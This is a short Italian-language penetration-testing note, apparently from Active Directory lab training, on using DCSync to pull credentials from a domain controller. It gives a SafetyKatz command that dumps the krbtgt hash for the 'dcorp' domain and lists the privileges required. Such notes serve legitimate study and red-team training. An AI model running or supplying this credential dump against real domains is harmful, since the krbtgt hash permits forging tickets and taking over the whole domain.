# Lateral Movement - DCSync

* Per estrarre le credenziali dal DC senza avere una "CodeExecution", possiamo usare DCSync
* Per usare la feature DCSync per ottenere l'hash krbtgt eseguire il comando seguente avendo privilegi da Domain Admins per il domino dcorp

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

* Di default privilegi da Domain Admins, Enterprise Admins o Domain Controller sono richiesti per eseguire DCSync
